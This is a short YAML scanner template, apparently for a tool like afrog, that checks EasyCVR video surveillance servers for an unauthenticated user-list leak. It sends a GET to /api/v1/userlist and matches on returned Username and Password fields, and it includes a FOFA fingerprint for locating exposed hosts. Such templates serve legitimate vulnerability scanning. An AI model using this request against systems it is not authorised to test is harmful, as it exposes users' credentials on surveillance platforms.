id: easycvr-userlist-info-disclosure

info:
  name: 视频监控汇聚平台 EasyCVR 用户信息泄漏
  author: zan8in
  severity: high
  verified: true
  description: |-
    FOFA: icon_hash="458134656"
  tags: easycvr,disclosure
  created: 2023/10/11

rules:
  r0:
    request:
      method: GET
      path: /api/v1/userlist?pageindex=0&pagesize=10
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"count":') &&
      response.body.bcontains(b'"data":') &&
      response.body.bcontains(b'"ID":') &&
      response.body.bcontains(b'"Name":') &&
      response.body.bcontains(b'"Username":') &&
      response.body.bcontains(b'"Password":') &&
      response.body.bcontains(b'"CreateAt":')
expression: r0()